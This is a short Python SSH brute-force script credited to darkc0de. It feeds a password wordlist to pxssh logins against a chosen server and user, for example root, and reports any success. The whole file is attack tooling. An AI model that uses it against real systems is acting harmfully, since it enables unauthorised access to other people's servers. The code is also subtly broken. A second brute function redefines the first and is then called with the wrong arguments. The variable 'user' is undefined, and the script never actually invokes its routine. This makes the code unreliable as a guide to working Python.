#!/usr/bin/env python3
# SSH BruteForcer

# http://www.darkc0de.com
# d3hydr8[at]gmail[dot]com

import sys
import time
from pexpect import pxssh

def brute(ip, user, word):
    print("Trying:", word)
    try:
        s = pxssh.pxssh()
        s.login(ip, user, word, login_timeout=10)
        s.sendline('uname -a')
        s.prompt()
        print("\n", s.before.decode())
        s.logout()
        print("\t[!] Login Success:", user, word, "\n")
        sys.exit(1)
    except Exception as e:
        # print("[-] Failed")
        pass
    except KeyboardInterrupt:
        print("\n[-] Quit\n")
        sys.exit(1)

print("\n\t   d3hydr8:darkc0de.com sshBrute v1.0")
print("\t----------------------------------------")

if len(sys.argv) != 4:
    print("\nUsage : ./sshbrute.py <server> <user> <wordlist>")
    print("Eg: ./sshbrute.py 198.162.1.1 root words.txt\n")
    sys.exit(1)

def brute(ip):
    command = 'uname -a'

    try:
        with open("passwords.txt", "r") as file:
            words = file.readlines()
    except IOError:
        print("\n[-] Error: Check your wordlist path\n")
        sys.exit(1)
    
    with open("usernames.txt", "r") as f:
        usernames = f.readlines()

    print("\n[+] Loaded:", len(words), "words")
    print("[+] Server:", ip)
    print("[+] User:", user)
    print("[+] BruteForcing...\n")


    for username in usernames:
        for word in words:
            # Change this time if needed
            time.sleep(0.5)
            brute(ip, user, word.replace("\n", ""))
